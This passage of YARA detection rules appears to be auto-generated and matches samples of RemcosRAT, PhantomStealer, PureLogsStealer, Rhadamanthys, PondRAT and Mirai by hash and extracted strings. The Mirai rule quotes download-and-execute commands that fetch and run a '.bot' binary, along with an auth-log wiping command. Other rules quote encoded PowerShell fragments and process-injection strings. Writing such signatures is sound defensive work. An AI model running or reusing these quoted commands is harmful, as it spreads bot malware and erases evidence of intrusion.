      hash7 = "aaa80a57fa8ecfcdcec28fec4b338eb015925e2e2b57b4aa910d559bce58199c"
      hash8 = "bb3b307d85e0e4c237c2e2ddd4222f7a93cf769c9064c08cba0940d44d62436a"
      hash9 = "c2d5e6e925c2450d4d5d8cba94c7570049a4da43647165fe9db23e009c977f91"
      hash10 = "d99f5dd0397a316ee7d28af1e8f5e5c558cacf00d3d21b10ef8135c94c9e3034"
      hash11 = "f5139fc2fa5525e89dde9d4d8ccf522bf60a7990fa0e213218a11d1f23c2d7ee"
   strings:
      $s1 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s2 = "syscall.procGetCurrentProcess" fullword ascii /* score: '19.00'*/
      $s3 = "syscall.procGetExitCodeProcess" fullword ascii /* score: '19.00'*/
      $s4 = "syscall.procGetProcessTimes" fullword ascii /* score: '19.00'*/
      $s5 = "syscall.procGetCurrentProcessId" fullword ascii /* score: '19.00'*/
      $s6 = "syscall.procOpenProcessToken" fullword ascii /* score: '17.00'*/
      $s7 = "syscall.procCreateProcessAsUserW" fullword ascii /* score: '17.00'*/
      $s8 = "runtime.getRandomData" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.getLoadLibrary" fullword ascii /* score: '15.00'*/
      $s10 = "runtime.heapBits.forwardOrBoundary" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.traceGCSweepStart" fullword ascii /* score: '15.00'*/
      $s12 = "runtime.traceGCSweepDone" fullword ascii /* score: '15.00'*/
      $s13 = "runtime.getArgInfoFast" fullword ascii /* score: '15.00'*/
      $s14 = "sync.(*Mutex).unlockSlow" fullword ascii /* score: '15.00'*/
      $s15 = "runtime.getargp" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__RemcosRAT_signature__47 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature).xls, RemcosRAT(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "74b7fe2a37873cd09951293c64f0890dde09496868460720c68b685036e47a3f"
      hash2 = "13e68e8c65365a1cd0ffc04e71bfef5750e89532800323f2d00e243a2f6359ba"
   strings:
      $s1 = "5300007742" ascii /* score: '17.00'*/ /* hex encoded string 'SwB' */
      $s2 = "5300007940" ascii /* score: '17.00'*/ /* hex encoded string 'Sy@' */
      $s3 = "5200005420" wide /* score: '17.00'*/ /* hex encoded string 'RT ' */
      $s4 = "HEX_HEAD_BOLT_M8X1.25X25_W_WASHER_8.8_SI" fullword ascii /* score: '9.00'*/
      $s5 = "HEX_SOCKET_HEAD_SCREW_M4X0.7X16_W_WASHER" fullword ascii /* score: '9.00'*/
      $s6 = "PAN_HEAD_SCREW_W_WASHER_AND_WASHER_SPRIN" fullword ascii /* score: '9.00'*/
      $s7 = "VinFast Trading and Production Joint Stock Company" fullword wide /* score: '9.00'*/
      $s8 = "HEX_SOCKET_CHEESE_HEAD_SCREWS_M5X0.8X8_8" fullword ascii /* score: '9.00'*/
      $s9 = "HEXAGONAL_HEAD_BOLT_AND_PLAIN_WASHER_ASS" fullword ascii /* score: '9.00'*/
      $s10 = "HEX_FLANGE_HEAD_M8X1.25X30_9.8_480H" fullword ascii /* score: '9.00'*/
      $s11 = "HEX_HEAD_SCREW_M8X1.25X35_10.9" fullword ascii /* score: '9.00'*/
      $s12 = "FIIL_HEAD_INT_TORX_SCREW_W_SELF_LOCKING_" fullword ascii /* score: '9.00'*/
      $s13 = "HEX_SOCKET_HEAD_CAP_SCREWS_COMBINATION_M" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__98e360f5_RemcosRAT_signature__f8171b3d_48 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_98e360f5.vbs, RemcosRAT(signature)_f8171b3d.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "98e360f5439624e57f17a742aa6451409d10c9d2c1e2f34af8f7b8596bd34066"
      hash2 = "f8171b3d2cd2907307787156152d8616c61f66d7cb36ac00a9691c99b458db4b"
   strings:
      $s1 = "4AUgBlAGYAbABlAGMAdABpAG8AbgAuAE0AZQB0AGgAbwBkAEEAdAB0AHIAaQBiAHUAdABlAHMAXQAnAFIAVABTAHAAZQBjAGkAYQBsAE4AYQBtAGUALABIAGkAZABlAE" ascii /* score: '11.00'*/
      $s2 = "0AaQB6AGEAdABpAG8AbgBSAGUAcwB1AGwAdAAgAD0AIABFAHgAZQBjAHUAdABlAC0AVwBhAHYAZQBTAHkAcwB0AGUAbQBPAHAAdABpAG0AaQB6AGEAdABpAG8AbgAKAC" ascii /* score: '11.00'*/
      $s3 = "QAUwBlAGMAdQByAGkAdAB5AE4AZQB1AHQAcgBhAGwAaQB6AGEAdABpAG8AbgBSAGUAcwB1AGwAdAAgAD0AIABFAHgAZQBjAHUAdABlAC0AVwBhAHYAZQBTAGUAYwB1AH" ascii /* score: '11.00'*/
      $s4 = "QAcwB1AHIAZgBiAG8AYQByAGQATQBlAG0AbwByAHkAUAByAG8AdABlAGMAdABvAHIALgBJAG4AdgBvAGsAZQAoACQAQwB1AHIAcgBlAG4AdABUAGEAcgBnAGUAdABBAG" ascii /* score: '11.00'*/
      $s5 = "AAPQAgAFIAZQBzAG8AbAB2AGUALQBXAGEAdgBlAFAAbwBpAG4AdABlAHIAIAAkAGMAdQByAHIAZQBuAHQASwBlAHIAbgBlAGwATABpAGIAcgBhAHIAeQAgACQAcwB1AH" ascii /* score: '11.00'*/
      $s6 = "kAbgBnAEEAZABkAHIAZQBzAHMALAAgACQAcwB1AHIAZgBiAG8AYQByAGQATQBvAGQAaQBmAGkAYwBhAHQAaQBvAG4ATABlAG4AZwB0AGgALAAgACQAYwB1AHIAcgBlAG" ascii /* score: '11.00'*/
      $s7 = "IAdQBpAGwAZABlAHIALgBEAGUAZgBpAG4AZQBEAHkAbgBhAG0AaQBjAE0AbwBkAHUAbABlACgAJABjAHUAcgByAGUAbgB0AEQAZQBsAGUAZwBhAHQAZQBJAGQALAAgAC" ascii /* score: '11.00'*/
      $s8 = "UAcgBmAGIAbwBhAHIAZABPAHIAaQBnAGkAbgBhAGwARABhAHQAYQBbACQAdABpAGQAZQBJAF0AIAAtAG4AZQAgACQAdABpAGQAZQBLAG4AbwB3AG4ATQBvAGQAWwAkAH" ascii /* score: '11.00'*/
      $s9 = "wAIAAkAHQAaQBkAGUASQApACwAIAAkAHQAaQBkAGUATQBvAGQAaQBmAGkAYwBhAHQAaQBvAG4ARABhAHQAYQBbACQAdABpAGQAZQBJAF0AKQAgAHwAIABPAHUAdAAtAE" ascii /* score: '11.00'*/
      $s10 = "8AbgB0AGUAeAB0AC4AUwBlAHMAcwBpAG8AbgBTAHQAYQB0AGUALgBMAGEAbgBnAHUAYQBnAGUATQBvAGQAZQAgAD0AIAAnAEYAdQBsAGwATABhAG4AZwB1AGEAZwBlAC" ascii /* score: '11.00'*/
      $s11 = "UAYwB0AGkAbwBuAC4ATQBlAHQAaABvAGQASQBtAHAAbABBAHQAdAByAGkAYgB1AHQAZQBzAF0AJwBSAHUAbgB0AGkAbQBlACwATQBhAG4AYQBnAGUAZAAnACkAIAB8AC" ascii /* score: '11.00'*/
      $s12 = "MAdQByAGYAYgBvAGEAcgBkAE0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQAQgB5AHQAZQAoAFsASQBuAHQAUAB0AHIAXQA6ADoAQQBkAGQAKAAkAH" ascii /* score: '11.00'*/
      $s13 = "0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJAB0AGkAZABlAFMAZQByAHYAaQBjAGUAQwBvAG" ascii /* score: '11.00'*/
      $s14 = "AALQBvAHIAIAAkAGMAdQByAHIAZQBuAHQATgBlAHgAdABQAHIAbwB2AGkAZABlAHIAIAAtAGUAcQAgACQAYwB1AHIAcgBlAG4AdABTAGUAcgB2AGkAYwBlAFAAcgBvAH" ascii /* score: '11.00'*/
      $s15 = "UAVAByAGEAYwBpAG4AZwBBAGQAZAByAGUAcwBzACwAIAAkAHQAaQBkAGUASQApACwAIAAkAHQAaQBkAGUAUABhAHQAYwBoAEIAeQB0AGUAcwBbACQAdABpAGQAZQBJAF" ascii /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x6147 or uint16(0) == 0x6f50 ) and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PondRAT_signature__POOLRAT_signature__Rhadamanthys_signature__706ff7ceac73ad82a8a11dc2fc70b900_imphash__49 {
   meta:
      description = "_subset_batch - from files PondRAT(signature).elf, POOLRAT(signature).elf, Rhadamanthys(signature)_706ff7ceac73ad82a8a11dc2fc70b900(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "973f7939ea03fd2c9663dafc21bb968f56ed1b9a56b0284acf73c3ee141c053c"
      hash2 = "85045d9898d28c9cdc4ed0ca5d76eceb457d741c5ca84bb753dde1bea980b516"
      hash3 = "2a34d0ce6c7f3a78f85130b7cddb53d41f94644ded37093b1bd7dee6b7f3bfee"
   strings:
      $s1 = "NTLM handshake failure (bad type-2 message). Target Info Offset Len is set incorrect by the peer" fullword ascii /* score: '20.00'*/
      $s2 = "Content-Disposition: %s%s%s%s%s%s%s" fullword ascii /* score: '16.00'*/
      $s3 = "Content-Type: %s%s%s" fullword ascii /* score: '16.00'*/
      $s4 = "SOCKS4%s: connecting to HTTP proxy %s port %d" fullword ascii /* score: '15.50'*/
      $s5 = "getaddrinfo() thread failed to start" fullword ascii /* score: '15.00'*/
      $s6 = "Excessive password length for proxy auth" fullword ascii /* score: '15.00'*/
      $s7 = "No valid port number in connect to host string (%s)" fullword ascii /* score: '15.00'*/
      $s8 = "Unsupported proxy '%s', libcurl is built without the HTTPS-proxy support." fullword ascii /* score: '13.00'*/
      $s9 = "oversized cookie dropped, name/val %zu + %zu bytes" fullword ascii /* score: '13.00'*/
      $s10 = "SOCKS5: connecting to HTTP proxy %s port %d" fullword ascii /* score: '13.00'*/
      $s11 = "Unsupported proxy scheme for '%s'" fullword ascii /* score: '13.00'*/
      $s12 = "Connection closure while negotiating auth (HTTP 1.0?)" fullword ascii /* score: '13.00'*/
      $s13 = "Unsupported proxy syntax in '%s'" fullword ascii /* score: '13.00'*/
      $s14 = "username=\"%s\",realm=\"%s\",nonce=\"%s\",cnonce=\"%s\",nc=\"%s\",digest-uri=\"%s\",response=%s,qop=%s" fullword ascii /* score: '12.50'*/
      $s15 = "username=\"%s\", realm=\"%s\", nonce=\"%s\", uri=\"%s\", cnonce=\"%s\", nc=%08x, qop=%s, response=\"%s\"" fullword ascii /* score: '12.50'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 8000KB and pe.imphash() == "706ff7ceac73ad82a8a11dc2fc70b900" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__ab6e6564_RemcosRAT_signature__d7385b3a_50 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_ab6e6564.vbs, RemcosRAT(signature)_d7385b3a.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ab6e6564ebba244fad962472b4fe56709d9fd10f6810f782d885f601169bb31a"
      hash2 = "d7385b3a68f8859d73bc9971463f6b6890ae63aaf56d309917c6935b00799b9b"
   strings:
      $s1 = "Tempoerskalmykisk = Tempoerskalmykisk - 7132332 " fullword ascii /* score: '19.00'*/
      $s2 = "Rem permanents stempelafgiftslove! apologiae; drummers" fullword ascii /* score: '16.00'*/
      $s3 = "Operationsplansvictor = Log(4426119)" fullword ascii /* score: '14.00'*/
      $s4 = "Rem Fiskeyngelens grafologernes ddstrusler mishandl172. voluntaryist" fullword ascii /* score: '12.00'*/
      $s5 = "Rem Extemporisers uroacidimeter psychopannychy nonulcerous255:" fullword ascii /* score: '11.00'*/
      $s6 = "Rem Forfiner! betokening systemiser: bgebrnde" fullword ascii /* score: '10.00'*/
      $s7 = "Rem Appassionatamente: babyliftens forretningsforbindelsens" fullword ascii /* score: '10.00'*/
      $s8 = "Rem Episyllogism engangsbger? anegrethes trimethylacetic!" fullword ascii /* score: '9.00'*/
      $s9 = "Rem Forebygget erasion? skirter166 bown" fullword ascii /* score: '9.00'*/
      $s10 = "Rem netvrket, unthrift, skdbarm postnatally!" fullword ascii /* score: '9.00'*/
      $s11 = "Rem Plaprendes postmillennialism; fjerdedelsnode! iagttagelsesvelser? andanter!" fullword ascii /* score: '9.00'*/
      $s12 = "Rem Computerbrugere. cykelparkeringen messingens!" fullword ascii /* score: '9.00'*/
      $s13 = "Fortrstningsunoperaticue = Trim(\"Slagtstavles\") " fullword ascii /* score: '9.00'*/
      $s14 = "Rem Legionrforpostens chartrings flagilate unblessed freeish:" fullword ascii /* score: '9.00'*/
      $s15 = "Rem Helmet? forsirings anthologising asterospondylic," fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x7546 and filesize < 90KB and ( 8 of them )
      ) or ( all of them )
}

rule _RedLineStealer_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__03c25256_RemcosRAT_signature__f34d5f2d4577ed6d9ceec516c_51 {
   meta:
      description = "_subset_batch - from files RedLineStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_03c25256.exe, RemcosRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a375f14f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "03c2525697754c84929e054bb97b2d48c4b25ccbb5108b7050b9e70d57c3bbf1"
      hash2 = "a375f14f98fb9a4242cc2528e0cc369542a197f8ed545a9c6cb445370b00ff29"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD#sY" fullword ascii /* score: '27.00'*/
      $s2 = "Event Log Analysis Report - " fullword wide /* score: '20.00'*/
      $s3 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '19.00'*/
      $s4 = "Error getting statistics for event log '" fullword wide /* score: '17.00'*/
      $s5 = "Error getting available event logs: " fullword wide /* score: '17.00'*/
      $s6 = "Error getting entry count for event log '" fullword wide /* score: '17.00'*/
      $s7 = "Event Log Analyzer - v1.0" fullword wide /* score: '17.00'*/
      $s8 = "EventLogAnalyzer.Forms.ErrorPatternForm.resources" fullword ascii /* score: '15.00'*/
      $s9 = "UpdateLogInfo" fullword ascii /* score: '15.00'*/
      $s10 = "labelLogInfo" fullword wide /* score: '15.00'*/
      $s11 = "Error reading event log '" fullword wide /* score: '15.00'*/
      $s12 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.csv" fullword wide /* score: '15.00'*/
      $s13 = "<GetEventLogStatistics>b__5_2" fullword ascii /* score: '14.00'*/
      $s14 = "GetEventLogStatistics" fullword ascii /* score: '14.00'*/
      $s15 = "<GetAvailableEventLogs>b__6_0" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__cc8ee04d9f6a0812cc52d3cecac318d2_imphash__RemcosRAT_signature__dcd2b16697810507d442c9bf8a9e913a_imphas_52 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe, Rhadamanthys(signature)_01916ef7.exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_ae9484be27b196745e2c08ee4e8427ca(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash2 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
      hash3 = "01916ef7e76245caac102dbb505ad4aebc28b7f1de7d7c311f31585d17cb6551"
      hash4 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
      hash5 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
      hash6 = "c9b7aa7a67392dd4537f636d4791e75984d3862280c301c9ca0f91424f64972c"
   strings:
      $s1 = "System.Collections.Generic.IEnumerator<System.Runtime.Loader.LibraryNameVariation>.get_Current@" fullword ascii /* score: '24.00'*/
      $s2 = "2GetRuntimeTypeBypassCache" fullword ascii /* score: '19.00'*/
      $s3 = ".set_DynamicTemplateType0set_DynamicGcStaticsData6set_DynamicNonGcStaticsData:set_DynamicThreadStaticsIndex0get_PointerToTypeMan" ascii /* score: '19.00'*/
      $s4 = ".set_DynamicTemplateType0set_DynamicGcStaticsData6set_DynamicNonGcStaticsData:set_DynamicThreadStaticsIndex0get_PointerToTypeMan" ascii /* score: '19.00'*/
      $s5 = "DReflectionExecutionDomainCallbacks&TypeLoaderCallbacks6StackTraceMetadataCallbacks$FunctionPointerOps[" fullword ascii /* score: '16.00'*/
      $s6 = "RehydrateTarget@" fullword ascii /* score: '14.00'*/
      $s7 = "8RhGetCurrentThreadStackTrace" fullword ascii /* score: '12.00'*/
      $s8 = "@TryGetMethodNameFromStartAddress@" fullword ascii /* score: '12.00'*/
      $s9 = "RhGetThunkSize2RhGetRuntimeHelperForType" fullword ascii /* score: '12.00'*/
      $s10 = ":GetRandomizedEqualityComparer@" fullword ascii /* score: '12.00'*/
      $s11 = ",IComparisonOperators`3" fullword ascii /* score: '12.00'*/
      $s12 = "&GetSystemDirectoryW" fullword ascii /* score: '12.00'*/
      $s13 = "GetHashCodeImpl<FastGetValueTypeHashCodeHelper" fullword ascii /* score: '12.00'*/
      $s14 = "fGetRuntimeInterfacesAlgorithmForNonPointerArrayType@" fullword ascii /* score: '12.00'*/
      $s15 = ":GetUnderlyingEqualityComparer@" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 26000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PhantomStealer_signature__54b647e7a2c96cc7cae60be08f1c6ee2_imphash__PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7_53 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_54b647e7a2c96cc7cae60be08f1c6ee2(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash)_2a1dbc0f.exe, RemcosRAT(signature)_75d4ca449a8e870d1b606db10dd417d9(imphash).exe, RemcosRAT(signature)_cc8ee04d9f6a0812cc52d3cecac318d2(imphash).exe, RemcosRAT(signature)_dcd2b16697810507d442c9bf8a9e913a(imphash).exe, RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe, Rhadamanthys(signature)_1cf0e310ff7ad39ecc43438ffa3a0bb9(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f232d497e23b33067266e2c9fb03f9ad66df46102b374a20d28c4200e227dbe9"
      hash2 = "e871bbb79c8b95b682d0d6870caeba86d70595ba711891abe6d210f38c79892b"
      hash3 = "2a1dbc0ffe84cdcbbfcf573609b9313cd3235ebabe66adf707c12d8b97d83568"
      hash4 = "6bd383fd777d39b1b6b0377430425c7f6e5b63070376ca69fe4d56f69b4395e5"
      hash5 = "3e2d372a69cc2489159da3251620c9f09f89a184a454b87a8c8382bb309333d9"
      hash6 = "c6499501e5e06658bb2353d8624de75952f86b0b44bb64ec0966ee1e8d97a7bf"
      hash7 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
      hash8 = "dcdd29b2d64f816751cec2150be92711e46f67bc657dd930630616f658605cbb"
      hash9 = "bef599d14222a9eccbebe09377f3a1ccc9e4e5367884c93c9af185c0f41bd335"
   strings:
      $s1 = "System.Core, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s2 = "icuuc.dll" fullword wide /* score: '23.00'*/
      $s3 = "icuin.dll" fullword wide /* score: '23.00'*/
      $s4 = "Failed to create suspended process" fullword wide /* score: '18.00'*/
      $s5 = "Failed to write process memory" fullword wide /* score: '18.00'*/
      $s6 = "*ComputePublicKeyToken" fullword ascii /* score: '16.00'*/
      $s7 = "System.Collections.Generic.IEnumerable<Internal.Reflection.Core.QScopeDefinition>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s8 = "System.Collections.Generic.IEnumerable<System.Type>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s9 = "System.Collections.Generic.IEnumerable<Internal.Metadata.NativeFormat.NamespaceDefinitionHandle>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s10 = "ReadProcessMemor" fullword wide /* score: '15.00'*/
      $s11 = "WriteProcessMemor" fullword wide /* score: '15.00'*/
      $s12 = "2GetStructUnsafeStructSize<GetForwardDelegateCreationStub" fullword ascii /* score: '14.00'*/
      $s13 = "The program executed an instruction that was thought to be unreachable" fullword wide /* score: '14.00'*/
      $s14 = "2GetRuntimeTypeHandleIfAny" fullword ascii /* score: '12.00'*/
      $s15 = "TGetRuntimeGenericParameterTypeInfoForTypes" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PhantomStealer_signature__54b647e7a2c96cc7cae60be08f1c6ee2_imphash__PhantomStealer_signature__c9596ccdffde444fa435c5f9042f7_54 {
   meta:
      description = "_subset_batch - from files PhantomStealer(signature)_54b647e7a2c96cc7cae60be08f1c6ee2(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, PhantomStealer(signature)_c9596ccdffde444fa435c5f9042f7548(imphash)_2a1dbc0f.exe, RemcosRAT(signature)_75d4ca449a8e870d1b606db10dd417d9(imphash).exe, RemcosRAT(signature)_e791f8773bf0061740713805d84feea8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "f232d497e23b33067266e2c9fb03f9ad66df46102b374a20d28c4200e227dbe9"
      hash2 = "e871bbb79c8b95b682d0d6870caeba86d70595ba711891abe6d210f38c79892b"
      hash3 = "2a1dbc0ffe84cdcbbfcf573609b9313cd3235ebabe66adf707c12d8b97d83568"
      hash4 = "6bd383fd777d39b1b6b0377430425c7f6e5b63070376ca69fe4d56f69b4395e5"
      hash5 = "cedcfe85d91b8e4cc835547efd2d7b761b4aad101f306435a925f708fbcf1037"
   strings:
      $s1 = "System.ComponentModel.Design.IDesignerHost.IsSupported" fullword ascii /* score: '25.00'*/
      $s2 = "Description: The process was terminated due to an internal error in the .NET Runtime" fullword wide /* score: '24.00'*/
      $s3 = "System.ComponentModel.TypeDescriptor.IsComObjectDescriptorSupported" fullword ascii /* score: '23.00'*/
      $s4 = "System.ComponentModel.DefaultValueAttribute.IsSupported" fullword ascii /* score: '20.00'*/
      $s5 = ".get_ShouldLogInEventLog" fullword ascii /* score: '20.00'*/
      $s6 = "icu.dll" fullword wide /* score: '20.00'*/
      $s7 = "Description: The process was terminated due to an unhandled exception" fullword wide /* score: '18.00'*/
      $s8 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '17.00'*/
      $s9 = "RtlGetReturnAddressHijackTarget" fullword ascii /* score: '17.00'*/
      $s10 = "System.GC.DTargetTCP" fullword ascii /* score: '17.00'*/
      $s11 = "Description: The application requested process termination through System.Environment.FailFast" fullword wide /* score: '17.00'*/
      $s12 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '16.00'*/
      $s13 = "peForTargetTypeNTryGetByRefTypeForTargetType_LookupOnly(GetCanonicalHashCode@" fullword ascii /* score: '16.00'*/
      $s14 = "DExecutionEnvironmentImplementation[" fullword ascii /* score: '16.00'*/
      $s15 = "The collection's comparer does not support the requested operation" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _PureLogsStealer_signature__97e5a31c945b50f9f6676688768eef5e_imphash__PureLogsStealer_signature__97e5a31c945b50f9f6676688768_55 {
   meta:
      description = "_subset_batch - from files PureLogsStealer(signature)_97e5a31c945b50f9f6676688768eef5e(imphash).exe, PureLogsStealer(signature)_97e5a31c945b50f9f6676688768eef5e(imphash)_52498820.exe, PureLogsStealer(signature)_97e5a31c945b50f9f6676688768eef5e(imphash)_d096e8bd.exe, PureLogsStealer(signature)_97e5a31c945b50f9f6676688768eef5e(imphash)_f2be0244.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "17827b50808e9db7bfa7e43f7d1ce10b7a5b0920c78bd21824615980b23c2f65"
      hash2 = "5249882063c9eefc16d3dcf0f00ecc6a52a4e47e4c01cd044d8678b7c32bb61d"
      hash3 = "d096e8bd91561e5192b5323aaec30ad22e6026f2fbf9e4cedfd440e32d41143e"
      hash4 = "f2be02443042481af515df1eabaf394ed00cb1a2a453ff66e92aed375ea49443"
   strings:
      $s1 = "__imp_Process32Next" fullword ascii /* score: '15.00'*/
      $s2 = "__imp_Process32First" fullword ascii /* score: '15.00'*/
      $s3 = "_head_lib64_libapi_ms_win_crt_private_l1_1_0_a" fullword ascii /* score: '12.00'*/
      $s4 = "_head_lib64_libapi_ms_win_crt_runtime_l1_1_0_a" fullword ascii /* score: '12.00'*/
      $s5 = "__imp_GetSystemDefaultLangID" fullword ascii /* score: '12.00'*/
      $s6 = "__imp_GetAsyncKeyState" fullword ascii /* score: '12.00'*/
      $s7 = "_head_lib64_libapi_ms_win_crt_multibyte_l1_1_0_a" fullword ascii /* score: '9.00'*/
      $s8 = "_head_lib64_libapi_ms_win_crt_heap_l1_1_0_a" fullword ascii /* score: '9.00'*/
      $s9 = ".refptr.__mingw_module_is_dll" fullword ascii /* score: '9.00'*/
      $s10 = "__imp__get_output_format" fullword ascii /* score: '9.00'*/
      $s11 = "__mingw_module_is_dll" fullword ascii /* score: '9.00'*/
      $s12 = ".rdata$.refptr.__mingw_module_is_dll" fullword ascii /* score: '9.00'*/
      $s13 = "_head_lib64_libapi_ms_win_crt_time_l1_1_0_a" fullword ascii /* score: '9.00'*/
      $s14 = "_head_lib64_libapi_ms_win_crt_string_l1_1_0_a" fullword ascii /* score: '9.00'*/
      $s15 = "_head_lib64_libapi_ms_win_crt_environment_l1_1_0_a" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "97e5a31c945b50f9f6676688768eef5e" and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__fd741c9a_Mirai_signature__fddced91_Mirai_signature__feb88695_56 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_fd741c9a.elf, Mirai(signature)_fddced91.elf, Mirai(signature)_feb88695.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fd741c9af26c97723390dc102ba1b98a753d145ec9779547fb915a05b01975a6"
      hash2 = "fddced91e3ab9bb4b3b0d1f62485438c12743d734698cc879981b96ac9d315d0"
      hash3 = "feb88695210f1ef75d904f23bccb4bc815d801d04b35df80e872f154f1f139a9"
   strings:
      $s1 = "/bin/busybox tftp -g %s -P %u -r %s -l .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s2 = "/bin/busybox wget %s%s -O .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '29.00'*/
      $s3 = "curl %s%s -o .bot && chmod +x .bot && ./.bot;" fullword ascii /* score: '25.00'*/
      $s4 = "echo > /var/log/auth.log 2>/dev/null" fullword ascii /* score: '23.00'*/
      $s5 = "[%s:%d->%s:%d] USER-AGENT: %s" fullword ascii /* score: '22.50'*/
      $s6 = "[%s:%d->%s:%d] PASSWORD: %s" fullword ascii /* score: '21.50'*/
      $s7 = "Coded at 3 AM on Adderall - you can tell" fullword ascii /* score: '20.00'*/
      $s8 = "sysctl -w net.ipv6.conf.all.forwarding=1 2>/dev/null" fullword ascii /* score: '20.00'*/
      $s9 = "[HTTP POST/PUT] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s10 = "[PRIORITY - %s] from %s to %s:" fullword ascii /* score: '17.50'*/
      $s11 = "User-Agent: Wget/1.12 (linux-gnu)" fullword ascii /* score: '17.00'*/
      $s12 = "sysctl -w net.ipv4.ip_forward=1 2>/dev/null" fullword ascii /* score: '17.00'*/
      $s13 = "User-Agent: wget" fullword ascii /* score: '17.00'*/
      $s14 = "HOST:%s|KERNEL:%s|ARCH:%s|" fullword ascii /* score: '17.00'*/
      $s15 = "user-agent: " fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

